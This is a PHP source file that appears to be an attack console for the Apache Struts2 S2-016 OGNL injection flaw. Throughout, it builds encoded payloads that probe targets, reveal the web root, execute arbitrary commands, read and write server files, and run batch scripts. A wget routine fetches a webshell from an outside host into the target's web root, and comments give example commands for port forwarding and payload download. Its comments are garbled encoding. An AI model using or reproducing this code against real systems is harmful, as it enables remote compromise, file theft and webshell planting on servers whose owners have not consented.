
<?php

    error_reporting(1);
    set_time_limit(60);

	define("LINUX","Linux");
	define("WIN","Windows");
	
	$str = @$_REQUEST['s'];
	$method = @$_REQUEST['m'];	 
	$action =@$_REQUEST['a'];	
	$file = @$_REQUEST['f'];
	$data = @$_REQUEST['d'];
    $filename = @$_REQUEST['n'];

	$isJson = 1;                //����json����
    $isHtmlEncode=1;
    $isBase64Encode=1;          //�ؼ����ݴ���ʹ��base64����
	$queryType = 1;				// 1 --> curl		2--> file_get_contents
	$max_buffersize = 50000;	//ִ���������Ե���󻺳�����С
	$timeout = 4;
	$SystemType = "";			//web�������Ĳ���ϵͳ����
	$WebRootDir = "";			//��ǰ��վ�ĸ�Ŀ¼
	$tmpfilename = "tmp";
	//$match_reg = "/<((html)|(head)|(title)|(body)|(div)|(span)|(xml))(\s)*>/i";
	$match_reg = "/<.*>/i";
	$ShellPlainDataUrl = "http://random90s.xicp.net/S2-16/GetShell.php";
	$file_path = "./file/";		//�������ļ�Ŀ¼
	$mark = "random";
	$host = $_SERVER['SERVER_NAME'];

	if(isset($method)){

    	$action  = preg_replace("/(http:\/\/)/i","",$action);
    	$action = "http://".$action;
    
    /**/
    	$checkhost = str_ireplace("http://","",$action);
    	 preg_match("/^(http:\/\/)?([^\/]+)/i",$checkhost, $checkhosts); 
    	$checkhost = $checkhosts[0];
    	if(strstr($checkhost,$host)){
    		//print 'host:'.$host."<br>";
    		//print 'checkhost:'.$checkhost."<br>";
    		$queryType = 2;	
    	}
    
    	switch($method){
    
    		//���ʹ��CheckStrutsVluns()���©��
    		case 1:	//over					
    			print CheckStrutsVluns($mark);
    			break;
    
    		//Զ������ִ��				
    		case 2:	//over
    			print RunCommand($str);
    			break;
    
    		//Զ������ִ�У����windowsϵͳִ�������޷����Ե�ȱ��			
    		case 3:	//over
    			print RunBatchCommand($str);
    			break;
    
    		case 4:	//over
    			print ReadFileFromServer($file);
    			break;
    
    		//ʹ��java��java.io.FileWriterд�ļ�--�ʺ�windows��linux
    		case 5:	//over
    			print WriteFileToServer($file,$data);
    			break;
    
    		//ʹ��wget���������ļ�����վ��Ŀ¼--���Linux
    		case 9:
    			print WgetFileExp($ShellPlainDataUrl,$shellname);
    			break;
    
    		default:
    			print PrintFileData($filename);
    	}
    	exit;
	}

	//��ӡ�ļ�����
	print PrintFileData($filename);
    
    exit;

?>



<!--#######################################################################################################-->

<?php
 
	//����json���ݸ�ʽ
	function GenJsonData( $type ='success', $data='ok',$isHtmlEncode=1) {
		
		global $isJson;
        if($isHtmlEncode){
    		//�ж�$data�Ƿ�Ϊ����
            if(is_array($data)){
                foreach($data as &$value){
                     $value = htmlspecialchars($value );
                }
                
            }else{
                $data = rtrim($data);
                $data = htmlspecialchars($data );
                $data = preg_replace("/(\r\n)|(\n)|(\r)/im", "<br/>", $data);
                //$data .="<br/>";
            }
        }
        
		if($isJson){
			$data = json_encode(array("result"=>$type,"data"=>$data));
		}else{
            if(is_array($data)){
                foreach($data as $key=>$value){
                    $data .= "<pre>".$key.':'.$value."</pre>";
                }
            }
		}
		return $data;
	}


	//���struts2-16©��
	function CheckStrutsVluns($data='ok'){

		global $isBase64Encode,$match_reg,$action,$SystemType,$WebRootDir,$queryType;
        
        //ʹ��base64����
        if($isBase64Encode){
            $data = base64_encode($data);
            $payload = '${#matt=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#matt.getWriter().println((new java.lang.String((new sun.misc.BASE64Decoder()).decodeBuffer("'.$data.'")))),#matt.getWriter().flush(),#matt.getWriter().close()}';            
        }else{
            $payload = '${#matt=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#matt.getWriter().println("'.$data.'"),#matt.getWriter().flush(),#matt.getWriter().close()}';            
		}
        $payload = urlEncode($payload);
        $ExpUrl = $action.'?'. 'redirect:'.$payload;
        if(strlen($ExpUrl)>1024){
            return GenJsonData("error","payload is too much long !");
        }
        //print $ExpUrl.'<br/>';		
		$contents = getHtmlContent($ExpUrl , $queryType);		
		//print $contents.'<br>';
		if( strlen($contents)>0&&
			!preg_match($match_reg,$contents)&&
			preg_match("/(.)*${mark}(.)*/i",$contents)){
			//����©���󣬾�����ȡĿ���������ϵͳ��Ϣ
            //print "start get server info...";
			GetWebServerInfo();
			//print "success";
			return GenJsonData("success", array('root'=>$WebRootDir,'system'=>$SystemType));
		}else{
			//print "error";
			return GenJsonData("error","web is safe.");
		}

	}
 
	//��ȡweb��������Ŀ¼
	function GetWebServerInfo(){

		global $action,$WebRootDir,$SystemType,$queryType;
		$payload = '${#matt=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#matt.getWriter().println(#context.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest").getRealPath("/")),#matt.getWriter().close()}';
		$payload = urlEncode($payload);
        $ExpUrl = $action.'?'. 'redirect:'.$payload;
        if(strlen($ExpUrl)>1024){
            return GenJsonData("error","payload is too much long !");
        }
		//print $ExpUrl.'<br/>';		
		$WebRootDir = getHtmlContent($ExpUrl , $queryType);		
		//print $contents.'<br>';
		if(preg_match('#^([a-zA-z]){1}:#i',$WebRootDir)){
			$SystemType = constant("WIN");		//	 "Windows";
		}else if(preg_match('#^/(.)+/#i',$WebRootDir)){
			$SystemType = constant("LINUX");	//	"Linux";
		}else{
			$SystemType = "Unknwon";
		}

	}

	//ִ��Զ������,Ĭ����ִֻ��ϵͳ·���µĳ��򣬵�Ȼ�����ʹ�ó����ȫ·����ʾ
	function RunCommand($CmdStr){	
	// $CmdStr ����Ϊ  whoami    /    c:\3389.bat    /    c:\lcx.exe -l 7777 8888      /   cscript c:\down.js http://127.0.0.1/down/lcs.exe  c:\temp\lcx.exe

		global $isBase64Encode,$max_buffersize,$action,$match_reg,$queryType;

		$CmdStr = urlDecode($CmdStr);
        $CmdStr = trim(trim($CmdStr));
		
        //���տո�������
		$CmdArray = explode(' ',$CmdStr);
		$count = count($CmdArray);
		$cmd = $CmdArray[0];

		$argv_str1 = $argv_str2 = "";
       
        //ʹ��base64����
        if($isBase64Encode){
            
            $cmd = base64_encode($cmd);
            $buffersize = base64_encode($max_buffersize);
            //ִ�к��в���������ʱ��Ҫ�������������
			for($i=1;$i<$count;$i++){
				$argv_str1 .= ',new java.lang.String(#de.decodeBuffer(#req.getParameter("argv'.$i.'")))';
				$argv_str2 .= '&argv'.$i.'='.urlEncode(base64_encode($CmdArray[$i]));
			}
            $payload = '${#de=new sun.misc.BASE64Decoder(),#req=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest"),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{new java.lang.String(#de.decodeBuffer(#req.getParameter("cmd")))'.$argv_str1.'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[new java.lang.String(#de.decodeBuffer(#req.getParameter("max_buffer")))],#num=#d.read(#e),#result=new java.lang.String(#e,0,#num),#matt=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#matt.getWriter().println(#result),#matt.getWriter().flush(),#matt.getWriter().close()}';
                 
            $payload = urlEncode($payload);
            $payload .= "&max_buffer=".urlEncode($buffersize);
            $payload .= '&cmd='.urlEncode($cmd);
            if(strlen($argv_str2)){
                $payload .= $argv_str2;
            }
            
        }else{
            //ִ�к��в���������ʱ��Ҫ�������������
			for($i=1;$i<$count;$i++){
				$argv_str1 .= ',#req.getParameter("argv'.$i.'")';
				$argv_str2 .= '&argv'.$i.'='.urlEncode($CmdArray[$i]);
			}
			$payload = '${#req=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest"),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{#req.getParameter("cmd")'.$argv_str1.'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[#req.getParameter("max_buffer")],#num=#d.read(#e),#result=new java.lang.String(#e,0,#num),#matt=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#matt.getWriter().println(#result),#matt.getWriter().flush(),#matt.getWriter().close()}';
            $payload = urlEncode($payload);
            $payload .= "&max_buffer=".urlEncode($buffersize);
            $payload .= '&cmd='.urlEncode($cmd);
            if(strlen($argv_str2)){
                $payload .= $argv_str2;
            }
        }
        
		$ExpUrl = $action.'?'.'redirect:'.$payload;
        if(strlen($ExpUrl)>1024){
            return GenJsonData("error","payload is too much long !");
        }
		//print $ExpUrl.'<br/>';		
		$contents = getHtmlContent($ExpUrl , $queryType,'POST',$data);		
		//print $contents.'<br>';	

		if(	 //strlen($contents)>0&&
			!preg_match($match_reg,$contents)){
			//$contents = preg_replace("/[(\r\n)(\n)(\r)]/im", htmlspecialchars("<br>"), $contents);	
			return GenJsonData("success",$contents);
		}else{
			return GenJsonData("error","command run error !");
		}

	}

	//ͨ����Զ�̷��������������ļ�$cmdfile��д������$cmd������������ִ�еĽ��д����־
	//$logfile,���ͨ����ȡ$logfile�������ִ�е�������
    //�����windowsϵͳִ�������޷����Ե�ȱ��
	function RunBatchCommand($cmd){

		global $WebRootDir,$SystemType,$tmpfilename;
		$subffix = rand(1,10);
		//�жϲ���ϵͳ����
		GetWebServerInfo();
		//���ｫ�������ļ�������ļ���д��web��������binĿ¼��
		
		if(constant("WIN") == $SystemType){
			//$batchfile='c:\\windows\\temp\\'/*.$tmpfilename*/.".bat";
			//$logfile = 'c:\\windows\\temp\\'/*.$tmpfilename*/.$subffix;
			$batchfile = ".bat";
			$logfile = ".log".$subffix;
			$cmd = "@echo off \r\n echo > $logfile \r\n ".$cmd;
		}else{
			//$batchfile = '/tmp/'/*.$tmpfilename*/.".sh";
			//$logfile = '/tmp/'/*.$tmpfilename*/.$subffix;
			$batchfile = "/tmp/.sh";
			$logfile = "/tmp/.log".$subffix;
			$cmd = "echo > $logfile\n".$cmd;
		}	

		$cmd .= " > ".$logfile;

		WriteFileToServer($batchfile,$cmd);
		if(constant("LINUX") == $SystemType)
			RunCommand("chmod 755 ${batchfile}");
		RunCommand($batchfile);
		return ReadFileFromServer($logfile);
        
	}



	//��ȡĿ�������$fullpath·���µ�$file�ļ�������
	function ReadFileFromServer($file){

		global $isBase64Encode,$max_buffersize,$action,$match_reg,$timeout,$queryType;
        
        $file = urlDecode($file);
        $file = trim($file);
 
        //ʹ��base64����
        if($isBase64Encode){
            $buffersize = base64_encode($max_buffersize);
            $file = base64_encode($file);
            $payload = '${#de=new sun.misc.BASE64Decoder(),#req=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest"),#matt=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#a=new char[new java.lang.String(#de.decodeBuffer(#req.getParameter("max_buffer")))],#f=new java.io.FileReader(new java.lang.String(#de.decodeBuffer(#req.getParameter("file")))),#num=#f.read(#a),#result=new java.lang.String(#a,0,#num),#matt.getWriter().println(#result),#matt.getWriter().flush(),#matt.getWriter().close()}'; 
        }else{
    		$payload = urlEncode('${#req=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest"),#matt=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#a=new char[#req.getParameter("max_buffer")],#f=new java.io.FileReader((new java.io.File(#req.getParameter("file")))),#num=#f.read(#a),#result=new java.lang.String(#a,0,#num),#matt.getWriter().println(#result),#matt.getWriter().flush(),#matt.getWriter().close()}');
 
        }     
        $payload = urlEncode($payload);      
        $payload .= "&max_buffer=".urlEncode($buffersize);
        $payload .= '&file='.urlEncode($file);
		$ExpUrl = $action.'?'.'redirect:'.$payload;
        if(strlen($ExpUrl)>1024){
            return GenJsonData("error","payload is too much long !");
        }
		//print $ExpUrl.'<br/>';	
		$contents = getHtmlContent($ExpUrl , $queryType);	
		if(strlen($contents) == 0){
			//print "start reread file.....";
			sleep($timeout);
			$contents=getHtmlContent($ExpUrl , $queryType);	
		}
		//print $contents.'<br>';	
		if(	 //strlen($contents)>0&&
			!preg_match($match_reg,$contents)){			 
			//$contents = preg_replace("/[(\r\n)(\n)(\r)]/im", htmlspecialchars("<br>"), $contents);	
			return GenJsonData("success",$contents);
		}else{
			return GenJsonData("error","File Not Found  or  No Permission!");
		}	

	}


	//��������е��ļ�$fileд������$data
	function WriteFileToServer($file,$data){

		global $isBase64Encode,$max_buffersize,$action,$queryType;

		if(1){
			//�жϲ���ϵͳ
		}
        
        $file = urlDecode($file);
        $file = trim($file);
        $data = urlDecode($data);
        
        //ʹ��base64����
        if($isBase64Encode){
            $data = base64_encode($data);
            $file = base64_encode($file);
            $payload = '${#de=new sun.misc.BASE64Decoder(),#req=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest"),#p=new java.lang.String(#de.decodeBuffer(#req.getParameter("file"))),new java.io.BufferedWriter(new java.io.FileWriter(#p)).append(new java.lang.String(#de.decodeBuffer(#req.getParameter("data")))).close()}';
        }else{
    		$payload = '${#req=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest"),#p=(#req.getParameter("file")),new java.io.BufferedWriter(new java.io.FileWriter(#p)).append(#req.getParameter("data")).close()}';
  
        }
        $payload = urlEncode($payload);
        $payload .= '&file='.urlEncode($file);
        $payload .= '&data='.urlEncode($data);
		$ExpUrl = $action.'?'.'redirect:'.$payload;
        if(strlen($ExpUrl)>1024){
            return GenJsonData("error","file size is too much long!");
        }
		//print $ExpUrl.'<br/>';		
		$contents = getHtmlContent($ExpUrl , $queryType);
		//print $contents.'<br>';	

		//if(ReadFileFromServer($file)){
			return GenJsonData("success","upload file: ".urlDecode(base64_decode($file)));
		//}
		
	}


	//����linuxϵͳ������ͨ��wget�����Զ�̷����������ļ�
	function WgetFileExp($ShellPlainDataUrl,$ShellName){
 
		global $max_buffersize,$action,$queryType;
		$payload = '${%23req%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22),%23file%3d(%23req.getParameter(%22file%22)),%23path%3d(%23req.getRealPath(%22/%22)),%23shell%3d(%23req.getParameter(%22shell%22)%2bnew java.lang.String(%22?%22)%2b%23file),%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%23req.getParameter(%22cmd%22),%23shell,%23req.getParameter(%22argv%22),%23path%2b%23file})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char['.$max_buffersize.'],%23d.read(%23e),%23matt%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}&cmd=wget&shell='.$ShellPlainDataUrl.'&argv=-O&file='.$ShellName;
		$payload = str_ireplace(' ', '%20', $ExpUrl); 
		$payload = str_ireplace('#', '%23', $ExpUrl); 
		$ExpUrl = $action.'?redirect:'.$payload;
		//print $ExpUrl.'<br/>';	
		$contents = getHtmlContent($ExpUrl , $queryType);	
		//print $contents.'<br/>';
		//��ȡ�ϴ���webshell����ʵ����
		//print "file:<a href='#'}>${shellname}</a> uploaded completely!";
		return $contents;
	}
	

	//��ӡ�ļ�����
	function PrintFileData($filename='1.jsp'){

		global $file_path;
        $data =null ;  
/*        
		$agent_reg = "#wget*#is";	//match Wget 
		$useragent = @$_SERVER['HTTP_USER_AGENT'];
        
		if(preg_match($agent_reg,$useragent) ){ //match Wget 
			header("Location: ".$file_path);
		}
*/
        $safe_reg = "#(\.\.((\/)|(\\\\))+)|(\.php.*$)|(\.inc.*$)#i";
        if(preg_match($safe_reg,$filename) ){  
            return  "illegal filename!";
		}

        $file = $file_path.'/'.$filename;
     	
        if( is_file($file)){
            $data = file_get_contents( $file );
           
            //$data = htmlspecialchars($data, ENT_NOQUOTES);
            
            return $data;
            
        }
        return "file not found !";
        
	}


?>

<!--#######################################################################################################-->

<?php

 	//��ȡ��ҳ����
	function getHtmlContent($url,$type=1,$method='GET',$data=null,$cookie=null){
		
        $contents = null;
        switch($type){
                        
            case 1:{//֧��GET��POST
            
                $contents = curl_content($url,$method,$data,$cookie);
                break;
            }            
            
            case 2:{//֧��GET��POST
                $contents = fget_content($url,$method,$data,$cookie);
                break;
            }            
             
            case 3:{//ֻ֧��GET
                
                $contents = fopen_content($url,$method,$data,$cookie);
                break;
            }
        }
        
        /*
		$len = strlen($content);
		echo "len = ".$len."<br/>";

		//ȥ����Ӧ�����еĳ���\r \n \t ����Ĳ�����ʾ�ַ�
		for($i=0;$i<$len;$i++){
			if($content[$i]<"\1F" && 
				//$content[$i] != "\r" &&
				$content[$i] != "\t"&&
				$content[$i] != "\n"){
				break;
			}
		}
		$content = substr($content,0,$i);
        */
		return $contents;  
	}   
   

    function curl_content($url,$method,$data,$cookie=null){
        //֧��GET��POST
		$contents = null;
        if(0 == strcasecmp($method,'POST')){
            $data = http_build_query($data);
        }else{
            $method = 'GET';      
        }       
        //print "curl ".$method."......";
	    $ch = curl_init();
        if(!isset($ch)|| $ch == null){
            die("Don't support php_curl !");
        }
        curl_setopt($ch,CURLOPT_URL,$url);
        //curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_NOBODY, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        if(0 == strcasecmp($method,'POST')){
            curl_setopt($ch,CURLOPT_POST,true);
            curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
        }
        $contents = curl_exec($ch);
        curl_close($ch);  
        return $contents; 

    }
    
    function fget_content($url,$method,$data,$cookie=null){
        //֧��GET��POST
		$contents = null;
		$post_data = null;
        if(0 == strcasecmp($method,'POST')){
            $post_data = http_build_query($data); 
        }else{
            $method = 'GET';
        }    
        //print "file_get_contents ".$method."......";
		$opts = array (  
		'http' => array (  
		'method' => $method,  
		'header'=> "Cookie: ".$cookie."\r\n",
        'content'=> $post_data));  
		//��������ľ���ļ�  
		$context = stream_context_create($opts);  
		$contents  = @file_get_contents($url, false, $context);    
        return $contents;
    }
       
    function fopen_content($url,$method,$data,$cookie=null){
    
        //ֻ֧��GET
        $contents=null;            
        //print "fopen GET......";
        $fp = fopen($url, "r" ); 
        if($fp == NULL){
        	return $method;
        }
        //һ�ζ�1024�ֽ�
        while(!feof($fp))
        	$contents .= fread($fp,1024); 
        fclose($fp);
        return $contents;
    }

	function Logs($info="random test"){
		$data = NULL;
		$tabs = "\t";
		$newline = "\n\n";
		$markline = "";//"-----------------------------------------------------------------------------------------------------------------------------------------------------------";

		$file = "./protect/#servers#.txt";	
		$useragent = @$_SERVER['HTTP_USER_AGENT'];
		$server_ip = GetClientIp().'['.@$_SERVER['REMOTE_HOST'].']';
		$uri = $_SERVER['REQUEST_URI'] ;//."?file=".$_SERVER['QUERY_STRING']; 
		$reference = @$_SERVER['HTTP_REFERER'];
		$date = date("Y-m-d h:i:s");
		$data .= "Time".$tabs."==>".$tabs.$date.$newline;
		$data .= "Agent".$tabs."==>".$tabs.$useragent.$newline;
		$data .= "IP".$tabs."==>".$tabs.$server_ip.$newline;
		$data .= "URI".$tabs."==>".$tabs.$uri.$newline;
		$data .= "Refer".$tabs."==>".$tabs.$reference.$newline;
		if(isset($info))
		$data .= $markline.$newline;
		$f = fopen($file, 'a+');  
		fputs($f, $data);  
		fclose($f);	

	}

	//��ȡ�ͻ���IP
	function GetClientIp(){
		global $ip;
		if (getenv("HTTP_CLIENT_IP"))
		$ip = getenv("HTTP_CLIENT_IP");
		else if(getenv("HTTP_X_FORWARDED_FOR"))
		$ip = getenv("HTTP_X_FORWARDED_FOR");
		else if(getenv("REMOTE_ADDR"))
		$ip = getenv("REMOTE_ADDR");
		else $ip = "Unknow";
		return $ip;
	}


?>

